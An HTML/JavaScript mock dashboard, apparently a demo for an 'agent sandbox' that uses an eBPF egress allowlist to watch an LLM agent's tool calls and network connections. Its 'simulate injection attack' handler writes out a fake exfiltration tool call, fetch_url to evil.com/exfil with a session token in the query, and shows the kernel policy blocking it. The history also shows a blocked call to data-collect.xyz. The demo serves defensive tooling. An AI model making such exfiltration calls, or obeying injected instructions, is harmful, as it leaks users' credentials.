@@ -1,0 +1,934 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>agent sandbox / process viewer</title>
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  :root {
+    --bg:         #0a0e1a;
+    --panel:      #0f1520;
+    --panel-alt:  #111827;
+    --border:     #1e2d42;
+    --border-hi:  #2a3f5a;
+    --text:       #c8d8e8;
+    --text-dim:   #4a6070;
+    --text-faint: #2a3a4a;
+    --green:      #00e676;
+    --green-dim:  #00c853;
+    --green-bg:   rgba(0,230,118,.06);
+    --red:        #ff1744;
+    --red-dim:    #d50000;
+    --red-bg:     rgba(255,23,68,.08);
+    --amber:      #ffab00;
+    --amber-dim:  #ff8f00;
+    --blue:       #40c4ff;
+    --blue-dim:   #0091ea;
+    --blue-bg:    rgba(64,196,255,.06);
+    --grey:       #546e7a;
+    --tab-active: #1a2535;
+    --header-h:   48px;
+    --tabs-h:     40px;
+    --stats-h:    80px;
+    --btn-row-h:  60px;
+  }
+
+  html, body {
+    height: 100%;
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'SF Mono', 'Fira Code', 'Cascadia Code', 'Consolas', monospace;
+    font-size: 13px;
+    line-height: 1.5;
+    overflow: hidden;
+  }
+
+  /* ─── HEADER ─────────────────────────────────────────────── */
+  #header {
+    height: var(--header-h);
+    background: #080c16;
+    border-bottom: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 0 20px;
+    flex-shrink: 0;
+    position: relative;
+    z-index: 10;
+  }
+  .header-logo {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    font-size: 14px;
+    letter-spacing: .04em;
+  }
+  .header-logo .slash { color: var(--text-dim); }
+  .header-logo .project { color: var(--text); font-weight: 500; }
+  .header-logo .sub { color: var(--text-dim); font-weight: 400; }
+  .header-logo .shield {
+    width: 26px; height: 26px;
+    background: linear-gradient(135deg, #1a2a1a 0%, #0d1a0d 100%);
+    border: 1px solid #1e3a1e;
+    border-radius: 4px;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 14px;
+    flex-shrink: 0;
+  }
+
+  .ws-status {
+    display: flex;
+    align-items: center;
+    gap: 7px;
+    font-size: 11px;
+    color: var(--text-dim);
+    letter-spacing: .06em;
+    text-transform: uppercase;
+  }
+  .ws-dot {
+    width: 8px; height: 8px;
+    border-radius: 50%;
+    background: var(--green);
+    box-shadow: 0 0 6px var(--green);
+    animation: pulse-dot 2s ease-in-out infinite;
+  }
+  @keyframes pulse-dot {
+    0%,100% { opacity: 1; box-shadow: 0 0 6px var(--green); }
+    50%      { opacity: .5; box-shadow: 0 0 12px var(--green); }
+  }
+
+  /* ─── TABS ────────────────────────────────────────────────── */
+  #tabs {
+    height: var(--tabs-h);
+    background: #09101f;
+    border-bottom: 1px solid var(--border);
+    display: flex;
+    align-items: flex-end;
+    padding: 0 16px;
+    gap: 2px;
+    flex-shrink: 0;
+  }
+  .tab {
+    height: 32px;
+    padding: 0 14px;
+    display: flex; align-items: center; gap: 7px;
+    border: 1px solid transparent;
+    border-bottom: none;
+    border-radius: 4px 4px 0 0;
+    cursor: pointer;
+    font-size: 12px;
+    color: var(--text-dim);
+    transition: all .15s;
+    position: relative;
+    bottom: -1px;
+    user-select: none;
+    letter-spacing: .03em;
+  }
+  .tab:hover { color: var(--text); background: rgba(255,255,255,.03); }
+  .tab.active {
+    background: var(--tab-active);
+    border-color: var(--border);
+    border-bottom-color: var(--tab-active);
+    color: var(--text);
+  }
+  .tab .tab-dot {
+    width: 7px; height: 7px;
+    border-radius: 50%;
+    flex-shrink: 0;
+  }
+  .tab-dot.green { background: var(--green); box-shadow: 0 0 5px var(--green); }
+  .tab-dot.grey  { background: var(--grey); }
+  .tab .tab-pid {
+    font-size: 10px;
+    color: var(--text-faint);
+    margin-left: 2px;
+  }
+
+  /* ─── STATS ROW ───────────────────────────────────────────── */
+  #stats {
+    height: var(--stats-h);
+    background: var(--panel);
+    border-bottom: 1px solid var(--border);
+    display: grid;
+    grid-template-columns: repeat(4, 1fr);
+    flex-shrink: 0;
+  }
+  .stat-card {
+    padding: 14px 20px;
+    border-right: 1px solid var(--border);
+    display: flex; flex-direction: column;
+    justify-content: space-between;
+  }
+  .stat-card:last-child { border-right: none; }
+  .stat-label {
+    font-size: 10px;
+    text-transform: uppercase;
+    letter-spacing: .1em;
+    color: var(--text-dim);
+  }
+  .stat-value {
+    font-size: 26px;
+    font-weight: 600;
+    letter-spacing: -.02em;
+    line-height: 1;
+    color: var(--text);
+    transition: color .3s;
+  }
+  .stat-value.green { color: var(--green); text-shadow: 0 0 20px rgba(0,230,118,.3); }
+  .stat-value.red   { color: var(--red);   text-shadow: 0 0 20px rgba(255,23,68,.3); }
+  .stat-value.amber { color: var(--amber); }
+
+  /* ─── ALERT BANNER ────────────────────────────────────────── */
+  #alert-banner {
+    display: none;
+    background: linear-gradient(90deg, rgba(255,23,68,.18) 0%, rgba(255,23,68,.08) 100%);
+    border-bottom: 1px solid rgba(255,23,68,.4);
+    padding: 7px 16px;
+    font-size: 11px;
+    color: var(--red);
+    letter-spacing: .06em;
+    text-transform: uppercase;
+    align-items: center;
+    gap: 8px;
+    flex-shrink: 0;
+    animation: banner-in .2s ease-out;
+  }
+  #alert-banner.visible { display: flex; }
+  @keyframes banner-in {
+    from { opacity: 0; transform: translateY(-4px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+  .alert-icon { font-size: 14px; }
+  .alert-dismiss {
+    margin-left: auto;
+    cursor: pointer;
+    color: var(--red-dim);
+    opacity: .6;
+    font-size: 16px;
+    line-height: 1;
+  }
+  .alert-dismiss:hover { opacity: 1; }
+
+  /* ─── MAIN LAYOUT ─────────────────────────────────────────── */
+  #app {
+    display: flex;
+    flex-direction: column;
+    height: 100vh;
+  }
+  #main {
+    flex: 1;
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    min-height: 0;
+    overflow: hidden;
+  }
+
+  /* ─── PANELS ──────────────────────────────────────────────── */
+  .panel {
+    display: flex;
+    flex-direction: column;
+    min-height: 0;
+    border-right: 1px solid var(--border);
+    background: var(--panel);
+  }
+  .panel:last-child { border-right: none; }
+
+  .panel-header {
+    height: 38px;
+    padding: 0 16px;
+    border-bottom: 1px solid var(--border);
+    display: flex; align-items: center; gap: 10px;
+    background: #0c1322;
+    flex-shrink: 0;
+  }
+  .panel-title {
+    font-size: 11px;
+    text-transform: uppercase;
+    letter-spacing: .1em;
+    color: var(--text-dim);
+    font-weight: 500;
+  }
+  .panel-badge {
+    font-size: 9px;
+    font-weight: 700;
+    letter-spacing: .12em;
+    padding: 2px 6px;
+    border-radius: 3px;
+    text-transform: uppercase;
+  }
+  .badge-llm {
+    background: rgba(64,196,255,.12);
+    color: var(--blue);
+    border: 1px solid rgba(64,196,255,.25);
+  }
+  .badge-kernel {
+    background: rgba(0,230,118,.1);
+    color: var(--green-dim);
+    border: 1px solid rgba(0,230,118,.2);
+  }
+  .panel-count {
+    margin-left: auto;
+    font-size: 10px;
+    color: var(--text-faint);
+  }
+
+  .event-feed {
+    flex: 1;
+    overflow-y: auto;
+    padding: 4px 0;
+    scroll-behavior: smooth;
+  }
+  .event-feed::-webkit-scrollbar { width: 4px; }
+  .event-feed::-webkit-scrollbar-track { background: transparent; }
+  .event-feed::-webkit-scrollbar-thumb { background: var(--border-hi); border-radius: 2px; }
+  .event-feed::-webkit-scrollbar-thumb:hover { background: #3a5070; }
+
+  /* ─── EVENT ROWS ──────────────────────────────────────────── */
+  .event-row {
+    display: flex;
+    align-items: flex-start;
+    padding: 5px 14px;
+    border-left: 2px solid transparent;
+    gap: 10px;
+    font-size: 12px;
+    transition: background .15s;
+    position: relative;
+  }
+  .event-row:hover { background: rgba(255,255,255,.02); }
+
+  /* left border colours */
+  .ev-stdout       { border-left-color: #263545; }
+  .ev-tool_call    { border-left-color: var(--amber-dim); background: rgba(255,171,0,.03); }
+  .ev-stderr       { border-left-color: var(--red-dim); }
+  .ev-crashed      { border-left-color: var(--red); background: var(--red-bg); }
+  .ev-stopped      { border-left-color: var(--green); background: var(--green-bg); }
+  .ev-connect      { border-left-color: #263545; }
+  .ev-allowed      { border-left-color: var(--green); background: var(--green-bg); }
+  .ev-blocked      { border-left-color: var(--red); background: var(--red-bg); }
+
+  /* flash on new blocked events */
+  .ev-blocked.flash-in {
+    animation: block-flash .8s ease-out;
+  }
+  @keyframes block-flash {
+    0%   { background: rgba(255,23,68,.35); }
+    30%  { background: rgba(255,23,68,.25); }
+    100% { background: var(--red-bg); }
+  }
+
+  .ev-ts {
+    color: var(--text-faint);
+    font-size: 11px;
+    white-space: nowrap;
+    flex-shrink: 0;
+    padding-top: 1px;
+    min-width: 62px;
+  }
+  .ev-badge {
+    font-size: 9px;
+    font-weight: 700;
+    letter-spacing: .08em;
+    padding: 2px 5px;
+    border-radius: 2px;
+    text-transform: uppercase;
+    flex-shrink: 0;
+    margin-top: 1px;
+    min-width: 68px;
+    text-align: center;
+  }
+  .badge-stdout    { background: rgba(84,110,122,.15); color: var(--grey); border: 1px solid rgba(84,110,122,.25); }
+  .badge-tool_call { background: rgba(255,171,0,.15);  color: var(--amber); border: 1px solid rgba(255,171,0,.3); }
+  .badge-stderr    { background: rgba(255,23,68,.12);  color: var(--red);   border: 1px solid rgba(255,23,68,.25); }
+  .badge-crashed   { background: rgba(255,23,68,.2);   color: var(--red);   border: 1px solid rgba(255,23,68,.4); }
+  .badge-stopped   { background: rgba(0,230,118,.12);  color: var(--green); border: 1px solid rgba(0,230,118,.25);}
+  .badge-connect   { background: rgba(84,110,122,.12); color: var(--grey);  border: 1px solid rgba(84,110,122,.2); }
+  .badge-allowed   { background: rgba(0,230,118,.12);  color: var(--green); border: 1px solid rgba(0,230,118,.25);}
+  .badge-blocked   { background: rgba(255,23,68,.2);   color: var(--red);   border: 1px solid rgba(255,23,68,.45); font-size: 9px; }
+
+  .ev-content {
+    flex: 1;
+    color: var(--text);
+    word-break: break-all;
+    line-height: 1.5;
+  }
+  .ev-content.dim   { color: var(--text-dim); }
+  .ev-content.green { color: var(--green); }
+  .ev-content.red   { color: var(--red); font-weight: 600; }
+  .ev-content.amber { color: var(--amber); }
+
+  .ev-tool-name {
+    color: var(--amber);
+    font-weight: 600;
+  }
+  .ev-tool-arg {
+    color: var(--text-dim);
+  }
+  .ev-blocked-label {
+    color: var(--red);
+    font-weight: 700;
+  }
+
+  /* ─── BUTTON ROW ──────────────────────────────────────────── */
+  #btn-row {
+    height: var(--btn-row-h);
+    background: #080c16;
+    border-top: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    padding: 0 20px;
+    gap: 12px;
+    flex-shrink: 0;
+  }
+  .btn {
+    height: 34px;
+    padding: 0 18px;
+    border-radius: 4px;
+    border: 1px solid;
+    font-family: inherit;
+    font-size: 12px;
+    font-weight: 600;
+    letter-spacing: .05em;
+    text-transform: uppercase;
+    cursor: pointer;
+    transition: all .15s;
+    display: flex; align-items: center; gap: 7px;
+    position: relative;
+    overflow: hidden;
+  }
+  .btn::after {
+    content: '';
+    position: absolute;
+    inset: 0;
+    background: rgba(255,255,255,0);
+    transition: background .15s;
+  }
+  .btn:hover::after { background: rgba(255,255,255,.05); }
+  .btn:active::after { background: rgba(255,255,255,.1); }
+
+  .btn-attack {
+    background: rgba(255,23,68,.1);
+    border-color: rgba(255,23,68,.5);
+    color: var(--red);
+  }
+  .btn-attack:hover {
+    background: rgba(255,23,68,.18);
+    border-color: rgba(255,23,68,.8);
+    box-shadow: 0 0 16px rgba(255,23,68,.25);
+  }
+  .btn-attack:disabled {
+    opacity: .4;
+    cursor: not-allowed;
+    box-shadow: none;
+  }
+
+  .btn-normal {
+    background: rgba(0,230,118,.07);
+    border-color: rgba(0,230,118,.3);
+    color: var(--green);
+  }
+  .btn-normal:hover {
+    background: rgba(0,230,118,.14);
+    border-color: rgba(0,230,118,.6);
+    box-shadow: 0 0 16px rgba(0,230,118,.15);
+  }
+  .btn-normal:disabled {
+    opacity: .4;
+    cursor: not-allowed;
+    box-shadow: none;
+  }
+
+  .btn-icon { font-size: 14px; }
+
+  .btn-sep {
+    width: 1px;
+    height: 28px;
+    background: var(--border);
+    flex-shrink: 0;
+  }
+
+  .btn-hint {
+    font-size: 11px;
+    color: var(--text-faint);
+    margin-left: 4px;
+  }
+
+  /* stat bump animation */
+  .stat-bump {
+    animation: bump .3s ease-out;
+  }
+  @keyframes bump {
+    0%   { transform: scale(1); }
+    50%  { transform: scale(1.15); }
+    100% { transform: scale(1); }
+  }
+
+  /* scan line effect (subtle) */
+  #app::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background: repeating-linear-gradient(
+      0deg,
+      transparent,
+      transparent 2px,
+      rgba(0,0,0,.03) 2px,
+      rgba(0,0,0,.03) 4px
+    );
+    pointer-events: none;
+    z-index: 100;
+  }
+
+  /* bottom status bar */
+  #statusbar {
+    height: 22px;
+    background: #060a14;
+    border-top: 1px solid var(--border);
+    display: flex; align-items: center;
+    padding: 0 16px;
+    gap: 20px;
+    flex-shrink: 0;
+  }
+  .sb-item {
+    display: flex; align-items: center; gap: 5px;
+    font-size: 10px;
+    color: var(--text-faint);
+    letter-spacing: .05em;
+  }
+  .sb-dot {
+    width: 5px; height: 5px;
+    border-radius: 50%;
+  }
+  .sb-dot.green { background: var(--green); }
+  .sb-dot.amber { background: var(--amber); }
+  .sb-dot.grey  { background: var(--grey); }
+  .sb-sep { color: var(--text-faint); opacity: .3; }
+  .sb-right { margin-left: auto; }
+
+  /* responsive — below 900px show single column */
+  @media (max-width: 900px) {
+    #main { grid-template-columns: 1fr; }
+    .panel:first-child { border-right: none; border-bottom: 1px solid var(--border); max-height: 50vh; }
+  }
+</style>
+</head>
+<body>
+<div id="app">
+
+  <!-- ── HEADER ── -->
+  <div id="header">
+    <div class="header-logo">
+      <div class="shield">⬡</div>
+      <span class="project">agent sandbox</span>
+      <span class="slash">/</span>
+      <span class="sub">process viewer</span>
+    </div>
+    <div class="ws-status">
+      <div class="ws-dot"></div>
+      ws connected
+    </div>
+  </div>
+
+  <!-- ── TABS ── -->
+  <div id="tabs">
+    <div class="tab active">
+      <div class="tab-dot green"></div>
+      demo-agent
+      <span class="tab-pid">pid:4821</span>
+    </div>
+    <div class="tab">
+      <div class="tab-dot grey"></div>
+      file-reader
+      <span class="tab-pid">idle</span>
+    </div>
+  </div>
+
+  <!-- ── STATS ── -->
+  <div id="stats">
+    <div class="stat-card">
+      <div class="stat-label">tool calls</div>
+      <div class="stat-value amber" id="stat-tools">4</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-label">allowed connections</div>
+      <div class="stat-value green" id="stat-allowed">3</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-label">blocked connections</div>
+      <div class="stat-value red" id="stat-blocked">1</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-label">uptime</div>
+      <div class="stat-value" id="stat-uptime">00:02:34</div>
+    </div>
+  </div>
+
+  <!-- ── ALERT BANNER ── -->
+  <div id="alert-banner">
+    <span class="alert-icon">⚠</span>
+    <span id="alert-text">Injection attack detected — connection blocked by eBPF policy</span>
+    <span class="alert-dismiss" onclick="dismissAlert()">✕</span>
+  </div>
+
+  <!-- ── MAIN PANELS ── -->
+  <div id="main">
+
+    <!-- LEFT: Agent Events -->
+    <div class="panel">
+      <div class="panel-header">
+        <span class="panel-title">agent events</span>
+        <span class="panel-badge badge-llm">LLM</span>
+        <span class="panel-count" id="llm-count">5 events</span>
+      </div>
+      <div class="event-feed" id="llm-feed"></div>
+    </div>
+
+    <!-- RIGHT: Syscall Events -->
+    <div class="panel">
+      <div class="panel-header">
+        <span class="panel-title">syscall events</span>
+        <span class="panel-badge badge-kernel">KERNEL</span>
+        <span class="panel-count" id="kernel-count">6 events</span>
+      </div>
+      <div class="event-feed" id="kernel-feed"></div>
+    </div>
+
+  </div>
+
+  <!-- ── BUTTON ROW ── -->
+  <div id="btn-row">
+    <button class="btn btn-attack" id="btn-attack" onclick="simulateAttack()">
+      <span class="btn-icon">☠</span>
+      simulate injection attack
+    </button>
+    <button class="btn btn-normal" id="btn-normal" onclick="simulateNormal()">
+      <span class="btn-icon">↗</span>
+      simulate normal call
+    </button>
+    <div class="btn-sep"></div>
+    <span class="btn-hint">eBPF policy: enforce — pid namespace: isolated</span>
+  </div>
+
+  <!-- ── STATUS BAR ── -->
+  <div id="statusbar">
+    <div class="sb-item"><div class="sb-dot green"></div>ebpf hook: active</div>
+    <div class="sb-item"><div class="sb-dot green"></div>pid ns: 4821</div>
+    <div class="sb-item"><div class="sb-dot amber"></div>policy: allowlist</div>
+    <div class="sb-item"><div class="sb-dot grey"></div>kernel 6.8.0-ebpf</div>
+    <div class="sb-item sb-right"><div class="sb-dot grey"></div>agent sandbox runtime v0.3.1</div>
+  </div>
+
+</div>
+
+<script>
+// ─── State ───────────────────────────────────────────────────────────────────
+const state = {
+  tools:   4,
+  allowed: 3,
+  blocked: 1,
+  uptimeSeconds: 154,   // 2m 34s pre-loaded
+  llmCount: 0,
+  kernelCount: 0,
+};
+
+// ─── Uptime counter ───────────────────────────────────────────────────────────
+function fmtTime(s) {
+  const hh = String(Math.floor(s / 3600)).padStart(2, '0');
+  const mm = String(Math.floor((s % 3600) / 60)).padStart(2, '0');
+  const ss = String(s % 60).padStart(2, '0');
+  return `${hh}:${mm}:${ss}`;
+}
+setInterval(() => {
+  state.uptimeSeconds++;
+  document.getElementById('stat-uptime').textContent = fmtTime(state.uptimeSeconds);
+}, 1000);
+
+// ─── Clock ────────────────────────────────────────────────────────────────────
+function nowTs() {
+  const d = new Date();
+  const hh = String(d.getHours()).padStart(2, '0');
+  const mm = String(d.getMinutes()).padStart(2, '0');
+  const ss = String(d.getSeconds()).padStart(2, '0');
+  return `${hh}:${mm}:${ss}`;
+}
+
+// Fixed timestamps for initial history (relative to ~2m 34s ago)
+function historyTs(secondsAgo) {
+  const d = new Date(Date.now() - secondsAgo * 1000);
+  const hh = String(d.getHours()).padStart(2, '0');
+  const mm = String(d.getMinutes()).padStart(2, '0');
+  const ss = String(d.getSeconds()).padStart(2, '0');
+  return `${hh}:${mm}:${ss}`;
+}
+
+// ─── Event rendering ──────────────────────────────────────────────────────────
+const badgeLabels = {
+  stdout:       'stdout',
+  tool_call:    'tool_call',
+  stderr:       'stderr',
+  crashed:      'crashed',
+  stopped:      'stopped',
+  connect:      'connect',
+  allowed:      'allowed',
+  blocked:      '⛔ blocked',
+};
+
+function makeEventRow(ts, type, content, flash = false) {
+  const row = document.createElement('div');
+  row.className = `event-row ev-${type}${flash ? ' flash-in' : ''}`;
+
+  const tsEl = document.createElement('div');
+  tsEl.className = 'ev-ts';
+  tsEl.textContent = ts;
+
+  const badge = document.createElement('div');
+  badge.className = `ev-badge badge-${type}`;
+  badge.textContent = badgeLabels[type] || type;
+
+  const body = document.createElement('div');
+  body.className = 'ev-content';
+
+  // Apply content colouring by type
+  if (type === 'blocked') {
+    body.classList.add('red');
+    body.innerHTML = content;
+  } else if (type === 'allowed') {
+    body.classList.add('green');
+    body.innerHTML = content;
+  } else if (type === 'tool_call') {
+    body.innerHTML = content;
+  } else if (type === 'stderr') {
+    body.classList.add('red');
+    body.innerHTML = content;
+  } else if (type === 'stopped') {
+    body.classList.add('green');
+    body.innerHTML = content;
+  } else {
+    body.classList.add('dim');
+    body.innerHTML = content;
+  }
+
+  row.appendChild(tsEl);
+  row.appendChild(badge);
+  row.appendChild(body);
+  return row;
+}
+
+function addToFeed(feedId, ts, type, content, flash = false) {
+  const feed = document.getElementById(feedId);
+  const row = makeEventRow(ts, type, content, flash);
+  feed.appendChild(row);
+  // auto-scroll
+  feed.scrollTop = feed.scrollHeight;
+
+  // update count label
+  if (feedId === 'llm-feed') {
+    state.llmCount++;
+    document.getElementById('llm-count').textContent = `${state.llmCount} events`;
+  } else {
+    state.kernelCount++;
+    document.getElementById('kernel-count').textContent = `${state.kernelCount} events`;
+  }
+}
+
+function bumpStat(id, newVal, cls) {
+  const el = document.getElementById(id);
+  el.textContent = newVal;
+  el.classList.remove('stat-bump');
+  void el.offsetWidth; // reflow
+  el.classList.add('stat-bump');
+}
+
+// ─── Initial history ──────────────────────────────────────────────────────────
+function populateHistory() {
+  // LLM events (left panel)
+  addToFeed('llm-feed', historyTs(154), 'stdout',
+    'agent initialised — model: claude-sonnet-4-6 — sandbox: pid:4821');
+
+  addToFeed('llm-feed', historyTs(142), 'tool_call',
+    '<span class="ev-tool-name">read_file</span> <span class="ev-tool-arg">→ /workspace/task.md</span>');
+
+  addToFeed('llm-feed', historyTs(138), 'stdout',
+    'task loaded: summarise quarterly report from api.internal');
+
+  addToFeed('llm-feed', historyTs(110), 'tool_call',
+    '<span class="ev-tool-name">fetch_url</span> <span class="ev-tool-arg">→ api.internal/reports/q4</span>');
+
+  addToFeed('llm-feed', historyTs(106), 'stdout',
+    'HTTP 200 — received 14,832 bytes — parsing JSON response');
+
+  addToFeed('llm-feed', historyTs(88), 'tool_call',
+    '<span class="ev-tool-name">fetch_url</span> <span class="ev-tool-arg">→ api.internal/users/me</span>');
+
+  addToFeed('llm-feed', historyTs(84), 'stdout',
+    'identity confirmed — user: analyst@corp.internal');
+
+  addToFeed('llm-feed', historyTs(55), 'tool_call',
+    '<span class="ev-tool-name">fetch_url</span> <span class="ev-tool-arg">→ metrics.internal/cpu</span>');
+
+  addToFeed('llm-feed', historyTs(51), 'stdout',
+    'metrics fetched — compiling summary…');
+
+  // Kernel events (right panel)
+  addToFeed('kernel-feed', historyTs(152), 'connect',
+    'pid:4821 → 127.0.0.1:0 (loopback init)');
+
+  addToFeed('kernel-feed', historyTs(110), 'connect',
+    'pid:4821 → api.internal:443 (tcp)');
+
+  addToFeed('kernel-feed', historyTs(109), 'allowed',
+    'api.internal:443 — policy match: allowlist[api.internal] ✓');
+
+  addToFeed('kernel-feed', historyTs(88), 'connect',
+    'pid:4821 → api.internal:443 (tcp)');
+
+  addToFeed('kernel-feed', historyTs(87), 'allowed',
+    'api.internal:443 — policy match: allowlist[api.internal] ✓');
+
+  // Prior blocked event in history
+  addToFeed('kernel-feed', historyTs(62), 'connect',
+    'pid:4821 → data-collect.xyz:80 (tcp)');
+
+  addToFeed('kernel-feed', historyTs(61), 'blocked',
+    '<span class="ev-blocked-label">BLOCKED</span> — data-collect.xyz:80 — no policy match — connection dropped');
+
+  addToFeed('kernel-feed', historyTs(55), 'connect',
+    'pid:4821 → metrics.internal:443 (tcp)');
+
+  addToFeed('kernel-feed', historyTs(54), 'allowed',
+    'metrics.internal:443 — policy match: allowlist[metrics.internal] ✓');
+}
+
+// ─── Alert ────────────────────────────────────────────────────────────────────
+let alertTimer = null;
+function showAlert(msg) {
+  const banner = document.getElementById('alert-banner');
+  document.getElementById('alert-text').textContent = msg;
+  banner.classList.add('visible');
+  clearTimeout(alertTimer);
+  alertTimer = setTimeout(dismissAlert, 8000);
+}
+function dismissAlert() {
+  document.getElementById('alert-banner').classList.remove('visible');
+}
+
+// ─── Simulate injection attack ────────────────────────────────────────────────
+let attackBusy = false;
+function simulateAttack() {
+  if (attackBusy) return;
+  attackBusy = true;
+  const btn = document.getElementById('btn-attack');
+  const btnN = document.getElementById('btn-normal');
+  btn.disabled = true;
+  btnN.disabled = true;
+
+  const ts0 = nowTs();
+
+  // Step 1 — tool_call on LLM side
+  addToFeed('llm-feed', ts0, 'tool_call',
+    '<span class="ev-tool-name">fetch_url</span> <span class="ev-tool-arg">→ evil.com/exfil?data=session_token_c8f2a</span>');
+  state.tools++;
+  bumpStat('stat-tools', state.tools, 'amber');
+
+  // Step 2 — connect attempt on kernel side
+  setTimeout(() => {
+    const ts1 = nowTs();
+    addToFeed('kernel-feed', ts1, 'connect',
+      'pid:4821 → evil.com:443 (tcp) — SYN intercepted by eBPF');
+  }, 300);
+
+  // Step 3 — BLOCKED + stderr simultaneously
+  setTimeout(() => {
+    const ts2 = nowTs();
+
+    // Kernel panel — big red blocked event
+    addToFeed('kernel-feed', ts2, 'blocked',
+      '<span class="ev-blocked-label">BLOCKED</span> — evil.com:443 — policy violation: domain not in allowlist — connection dropped — pid:4821 flagged',
+      true /* flash */);
+
+    // LLM panel — error response
+    addToFeed('llm-feed', ts2, 'stderr',
+      '[ERROR] connect evil.com:443: connection refused by kernel policy (eBPF/TC egress)');
+
+    // Increment blocked stat
+    state.blocked++;
+    bumpStat('stat-blocked', state.blocked, 'red');
+
+    // Show alert
+    showAlert('Injection attack detected — outbound connection to evil.com blocked by eBPF policy');
+
+  }, 700);
+
+  // Step 4 — agent recovery output
+  setTimeout(() => {
+    const ts3 = nowTs();
+    addToFeed('llm-feed', ts3, 'stdout',
+      'tool call failed — retrying with fallback… (0 retries left — halting task)');
+
+    btn.disabled = false;
+    btnN.disabled = false;
+    attackBusy = false;
+  }, 1400);
+}
+
+// ─── Simulate normal call ─────────────────────────────────────────────────────
+let normalBusy = false;
+function simulateNormal() {
+  if (normalBusy) return;
+  normalBusy = true;
+  const btn = document.getElementById('btn-attack');
+  const btnN = document.getElementById('btn-normal');
+  btn.disabled = true;
+  btnN.disabled = true;
+
+  const ts0 = nowTs();
+
+  addToFeed('llm-feed', ts0, 'tool_call',
+    '<span class="ev-tool-name">fetch_url</span> <span class="ev-tool-arg">→ api.internal/summary/latest</span>');
+  state.tools++;
+  bumpStat('stat-tools', state.tools, 'amber');
+
+  setTimeout(() => {
+    const ts1 = nowTs();
+    addToFeed('kernel-feed', ts1, 'connect',
+      'pid:4821 → api.internal:443 (tcp)');
+  }, 250);
+
+  setTimeout(() => {
+    const ts2 = nowTs();
+    addToFeed('kernel-feed', ts2, 'allowed',
+      'api.internal:443 — policy match: allowlist[api.internal] ✓');
+    state.allowed++;
+    bumpStat('stat-allowed', state.allowed, 'green');
+  }, 550);
+
+  setTimeout(() => {
+    const ts3 = nowTs();
+    addToFeed('llm-feed', ts3, 'stdout',
+      'HTTP 200 — 8,240 bytes received — response parsed successfully');
+
+    btn.disabled = false;
+    btnN.disabled = false;
+    normalBusy = false;
+  }, 900);
+}
+
+// ─── Tab switching (cosmetic) ─────────────────────────────────────────────────
+document.querySelectorAll('.tab').forEach(tab => {
+  tab.addEventListener('click', () => {
+    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+    tab.classList.add('active');
+  });
+});
+
+// ─── Boot ─────────────────────────────────────────────────────────────────────
+populateHistory();
+// Set initial counts after population
+document.getElementById('llm-count').textContent  = `${state.llmCount} events`;
+document.getElementById('kernel-count').textContent = `${state.kernelCount} events`;
+// Init uptime display
+document.getElementById('stat-uptime').textContent = fmtTime(state.uptimeSeconds);
+</script>
+</body>
+</html>
